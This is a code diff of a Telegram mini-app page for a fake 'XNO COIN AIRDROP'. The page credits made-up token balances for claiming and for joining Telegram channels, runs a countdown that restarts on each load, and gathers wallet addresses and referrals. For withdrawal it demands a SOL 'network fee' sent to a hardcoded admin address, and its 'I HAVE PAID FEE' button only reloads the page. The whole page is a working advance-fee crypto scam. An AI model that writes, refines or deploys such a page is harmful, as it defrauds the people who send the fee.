@@ -3,114 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XNO Airdrop</title>
+    <title>Xno Airdrop - Telegram Mini App</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; user-select: none; }
-        .card { background: #1e2329; border-radius: 16px; border: 1px solid #2d3339; }
-        .tab-content { display: none; }
-        .active-tab { display: block; }
-        .nav-item { color: #848e9c; cursor: pointer; text-align: center; font-size: 11px; transition: 0.3s; }
-        .active-nav { color: #f1c40f; }
-        /* আপনার স্ক্রিনশটের মতো বড় লোগো রিং */
-        .big-logo-ring { 
-            width: 250px; height: 250px; border-radius: 50%; 
-            border: 5px solid #f1c40f; 
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 30px rgba(241, 196, 15, 0.1);
-        }
-        .btn-withdraw { background: #22c55e; color: white; font-weight: 800; border-radius: 12px; }
-        .green-box { background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.3); border-radius: 12px; color: #22c55e; }
+        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .card { background: #181a20; border-radius: 16px; padding: 20px; border: 1px solid #2b2f36; margin-bottom: 15px; }
+        .gradient-btn { background: linear-gradient(90deg, #3a86ff, #8338ec); border: none; transition: 0.3s; }
+        .withdraw-btn { background-color: #02c076; font-weight: bold; box-shadow: 0 4px 15px rgba(2, 192, 118, 0.3); }
+        .timer-box { border: 2px solid #3a86ff; border-radius: 12px; padding: 15px; background: rgba(58, 134, 255, 0.05); }
+        .task-done { display: none; } /* টাস্ক শেষ হলে ভ্যানিশ হয়ে যাবে */
+        .fee-popup { background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); }
     </style>
 </head>
-<body class="p-4 pb-24">
+<body class="p-4 max-w-md mx-auto">
 
-    <div class="card p-3 mb-8 text-center border-blue-500/10">
-        <p class="text-[9px] text-gray-500 uppercase tracking-widest mb-1">Airdrop Distribution Countdown</p>
-        <div class="flex justify-center gap-4 font-bold text-blue-400 text-lg">
-            <div>15 <p class="text-[7px] text-gray-600">DAYS</p></div>:
-            <div>16 <p class="text-[7px] text-gray-600">HRS</p></div>:
-            <div>08 <p class="text-[7px] text-gray-600">MIN</p></div>:
-            <div>20 <p class="text-[7px] text-gray-600">SEC</p></div>
+    <div class="text-center my-8">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR85o8-jE7U6FmY6X9xW8Z-J6_5G-K4f7kGbg&s" alt="Xno Logo" class="w-28 mx-auto rounded-full border-4 border-blue-500 shadow-2xl animate-pulse">
+        <h1 class="text-2xl font-black mt-3 tracking-tighter text-blue-400">XNO COIN AIRDROP</h1>
+    </div>
+
+    <div class="card text-center">
+        <p class="text-gray-400 text-sm font-semibold uppercase mb-2">Airdrop Ending In:</p>
+        <div id="timer" class="timer-box text-2xl font-mono font-bold text-white tracking-widest">
+            16d : 23h : 59m : 59s
         </div>
     </div>
 
-    <div id="homeTab" class="tab-content active-tab text-center">
-        <h1 class="text-5xl font-black italic italic mb-1">10,000 <span class="text-blue-500 text-2xl italic">XNO</span></h1>
-        <p class="text-gray-500 text-[10px] uppercase mb-8">Verified Balance</p>
-
-        <div class="flex justify-center mb-10">
-            <div class="big-logo-ring">
-                <span class="text-xl font-bold text-yellow-500 uppercase">XNO Logo</span>
-            </div>
-        </div>
-
-        <div class="green-box p-4 flex items-center justify-center gap-2 mb-6">
-            <i class="fas fa-check-circle"></i> 10,000 XNO SECURED!
-        </div>
-    </div>
-
-    <div id="taskTab" class="tab-content">
-        <h2 class="text-2xl font-bold mb-6 italic"><i class="fas fa-bolt text-blue-500"></i> New Tasks</h2>
-        <div class="card p-4 flex justify-between items-center mb-4">
-            <div class="flex items-center gap-3">
-                <i class="fab fa-telegram text-2xl text-blue-400"></i>
-                <div><p class="text-sm font-bold">Join Official Channel</p><p class="text-[9px] text-blue-400">+5,000 XNO</p></div>
-            </div>
-            <button onclick="tg.openLink('https://t.me/XNO_AIRDROP_OFFICIAL')" class="bg-blue-600 px-6 py-2 rounded-lg text-xs font-bold">START</button>
-        </div>
-    </div>
-
-    <div id="walletTab" class="tab-content">
-        <h2 class="text-2xl font-bold mb-6 italic">Withdraw Funds</h2>
+    <div class="card text-center">
+        <p class="text-gray-400">Your Xno Balance</p>
+        <h2 id="balance" class="text-5xl font-extrabold text-white mt-2">0.00</h2>
+        <p class="text-blue-500 font-bold">XNO</p>
         
-        <div class="card p-5 mb-6">
-            <p class="text-[10px] text-blue-400 font-bold mb-2 uppercase">Receiver Wallet (SOL/XNO)</p>
-            <input type="text" placeholder="Paste your address here" class="w-full bg-black/40 border border-gray-700 p-3 rounded-xl text-sm outline-none mb-4">
-            <button onclick="tg.showAlert('Address Saved!')" class="w-full py-3 bg-blue-600 rounded-xl font-bold text-xs uppercase">SAVE DETAILS</button>
-        </div>
+        <button id="claimBtn" onclick="claimWelcome()" class="gradient-btn w-full py-4 mt-6 rounded-2xl font-black text-lg">CLAIM 10,000 XNO</button>
+    </div>
 
-        <button onclick="handleWithdraw()" class="w-full py-5 btn-withdraw shadow-lg active:scale-95 transition-all">
-            WITHDRAW
-        </button>
-
-        <div id="feeSection" class="hidden mt-6 card p-5 border-yellow-500/20">
-            <p class="text-xs text-yellow-500 font-bold mb-1">Fee: 0.002 SOLANA</p>
-            <p class="text-[9px] text-gray-500 mb-3 break-all">6pDb7eYdLUUrrSmKdh5H1FXGTTfE1b4pFhGaYFiuMkG3</p>
-            <input type="text" placeholder="Enter Transaction ID" class="w-full bg-black/60 border border-gray-700 p-3 rounded-lg text-[10px] mb-2 outline-none">
-            <button onclick="tg.showAlert('Verifying TxID...')" class="w-full py-2 bg-gray-700 rounded-lg text-[10px] font-bold">SUBMIT TxID</button>
+    <div class="card">
+        <h3 class="font-bold text-lg mb-4 text-yellow-500">Binance Wallet</h3>
+        <div id="walletDisplay">
+            <button onclick="connectWallet()" class="w-full py-3 bg-gray-700 rounded-xl font-bold hover:bg-gray-600 transition">Connect Wallet</button>
         </div>
     </div>
 
-    <div class="fixed bottom-0 left-0 w-full bg-[#0b0e11] border-t border-gray-800 flex justify-around p-4">
-        <div onclick="showTab('homeTab', this)" class="nav-item active-nav flex-1"><i class="fas fa-home text-xl mb-1 block"></i>HOME</div>
-        <div onclick="showTab('taskTab', this)" class="nav-item flex-1"><i class="fas fa-list text-xl mb-1 block"></i>TASK</div>
-        <div onclick="showTab('walletTab', this)" class="nav-item flex-1"><i class="fas fa-wallet text-xl mb-1 block"></i>WALLET</div>
+    <div id="taskContainer">
+        <div id="taskHeader" class="px-2 mb-3 flex justify-between items-center">
+            <h3 class="font-bold">Tasks (80 XNO each)</h3>
+            <span id="taskCounter" class="text-xs bg-blue-600 px-2 py-1 rounded">0/3</span>
+        </div>
+
+        <div id="task1" class="card flex justify-between items-center">
+            <span class="text-sm">Join Telegram Channel 1</span>
+            <a href="https://t.me/XNO_AIRDROP_OFFICIAL" target="_blank" onclick="completeTask(1)" class="bg-blue-600 px-5 py-2 rounded-lg font-bold text-xs">JOIN</a>
+        </div>
+
+        <div id="task2" class="card flex justify-between items-center">
+            <span class="text-sm">Join Telegram Channel 2</span>
+            <a href="https://t.me/+pO1956ctV4JiODg9" target="_blank" onclick="completeTask(2)" class="bg-blue-600 px-5 py-2 rounded-lg font-bold text-xs">JOIN</a>
+        </div>
+
+        <div id="task3" class="card flex justify-between items-center">
+            <span class="text-sm">Follow on Twitter/X</span>
+            <a href="https://x.com/i/status/2035895387677233355" target="_blank" onclick="completeTask(3)" class="bg-blue-600 px-5 py-2 rounded-lg font-bold text-xs">FOLLOW</a>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3 class="font-bold mb-2">Refer Friends</h3>
+        <p class="text-xs text-gray-400 mb-4">Earn 30 XNO for every friend you invite.</p>
+        <div class="flex">
+            <input type="text" readonly value="https://t.me/XnoAirdropBot?start=user123" class="w-full bg-black border border-gray-700 p-3 rounded-l-xl text-xs text-blue-300">
+            <button class="bg-blue-600 px-4 rounded-r-xl font-bold text-sm">COPY</button>
+        </div>
+    </div>
+
+    <button onclick="handleWithdraw()" class="withdraw-btn w-full py-5 rounded-2xl mb-12 text-white font-black text-xl uppercase italic">Withdraw Now</button>
+
+    <div id="feeModal" class="fee-popup fixed inset-0 hidden items-center justify-center p-6 z-50">
+        <div class="bg-gray-900 p-6 rounded-3xl w-full max-w-sm text-center border-2 border-green-500">
+            <h2 class="text-2xl font-black text-white mb-2">WITHDRAWAL FEE</h2>
+            <p class="text-sm text-gray-400 mb-6">To complete your transaction, send the network fee below:</p>
+            
+            <div class="bg-black p-5 rounded-2xl border border-gray-700 mb-6">
+                <p class="text-green-400 font-black text-2xl mb-1">0.0026 SOL</p>
+                <div class="h-[1px] bg-gray-800 my-3"></div>
+                <p class="text-[10px] text-gray-500 uppercase font-bold mb-2">Admin SOL Address:</p>
+                <p id="solAddr" class="text-[11px] text-blue-400 break-all font-mono select-all">6pDb7eYdLUUrrSmKdh5H1FXGTTfE1b4pFhGaYFiuMkG3</p>
+            </div>
+
+            <button onclick="window.location.reload()" class="bg-green-600 w-full py-4 rounded-xl font-black text-white shadow-lg">I HAVE PAID FEE</button>
+            <button onclick="closeModal()" class="mt-4 text-gray-500 text-sm font-bold">CLOSE</button>
+        </div>
     </div>
 
     <script>
-        let tg = window.Telegram.WebApp;
-        tg.expand();
-        let isEnded = false; // ক্লেইম অপশন দেখার জন্য false রাখা হয়েছে
+        let balance = 0;
+        let isClaimed = false;
+        let tasksDone = 0;
+        let isAirdropOver = false;
 
-        function showTab(id, el) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-tab'));
-            document.getElementById(id).classList.add('active-tab');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav'));
-            el.classList.add('active-nav');
+        // 1. Welcome Claim (Once Only)
+        function claimWelcome() {
+            if (!isClaimed) {
+                balance += 10000;
+                isClaimed = true;
+                updateBalance();
+                let btn = document.getElementById('claimBtn');
+                btn.innerText = "CLAIMED SUCCESSFULLY";
+                btn.style.opacity = "0.5";
+                btn.disabled = true;
+            }
         }
 
-        function handleWithdraw() {
-            if (!isEnded) {
-                // টাইমার শেষ হওয়ার আগে এই মেসেজ
-                tg.showAlert("You can withdraw your valuable tokens only after the Airdrop ends.");
-            } else {
-                // টাইমার শেষ হওয়ার পর ফী ইনফো দেখাবে
-                document.getElementById('feeSection').classList.remove('hidden');
-                tg.showAlert("Network Verification Required. Fee: 0.002 SOLANA.");
+        // 2. Task Completion (3 Tasks Only)
+        function completeTask(id) {
+            let taskElement = document.getElementById('task' + id);
+            if (!taskElement.classList.contains('task-done')) {
+                balance += 80;
+                tasksDone++;
+                updateBalance();
+                taskElement.classList.add('task-done');
+                document.getElementById('taskCounter').innerText = tasksDone + "/3";
+                
+                if (tasksDone === 3) {
+                    setTimeout(() => {
+                        document.getElementById('taskContainer').innerHTML = "<div class='card text-center border-green-500'><p class='text-green-500 font-black'>✅ ALL TASKS COMPLETED</p></div>";
+                    }, 400);
+                }
             }
+        }
+
+        // 3. Wallet Connect (Binance Style)
+        function connectWallet() {
+            let address = prompt("Paste your SOL address from Binance:");
+            if (address && address.length > 20) {
+                document.getElementById('walletDisplay').innerHTML = `
+                    <div class="flex items-center justify-between">
+                        <div>
+                            <p class="text-green-500 text-xs font-bold uppercase tracking-widest">● Connected</p>
+                            <p class="text-[10px] text-gray-400 font-mono mt-1">${address.substring(0,25)}...</p>
+                        </div>
+                        <button onclick="location.reload()" class="text-[10px] text-red-500 font-bold border border-red-900 px-2 py-1 rounded">REMOVE</button>
+                    </div>
+                `;
+            } else if (address) {
+                alert("Invalid SOL address!");
+            }
+        }
+
+        // 4. Update Balance Utility
+        function updateBalance() {
+            document.getElementById('balance').innerText = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
+        }
+
+        // 5. Precise Timer (16d 23h 59m)
+        let countdownTime = new Date().getTime() + (16 * 24 * 60 * 60 * 1000) + (23 * 60 * 60 * 1000) + (59 * 60 * 1000);
+
+        let timerInterval = setInterval(function() {
+            let now = new Date().getTime();
+            let timeLeft = countdownTime - now;
+
+            let d = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+            let h = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            let m = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+            let s = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+            document.getElementById("timer").innerHTML = d + "d : " + h + "h : " + m + "m : " + s + "s";
+
+            if (timeLeft < 0) {
+                clearInterval(timerInterval);
+                isAirdropOver = true;
+                document.getElementById("timer").innerHTML = "AIRDROP FINISHED";
+                document.getElementById("timer").classList.add("text-green-500");
+            }
+        }, 1000);
+
+        // 6. Withdraw Logic with Post-Airdrop Fee
+        function handleWithdraw() {
+            if (!isAirdropOver) {
+                alert("Airdrop is active! You can withdraw your valuable tokens only after the Airdrop ends.");
+            } else {
+                document.getElementById('feeModal').style.display = 'flex';
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('feeModal').style.display = 'none';
         }
     </script>
 </body>
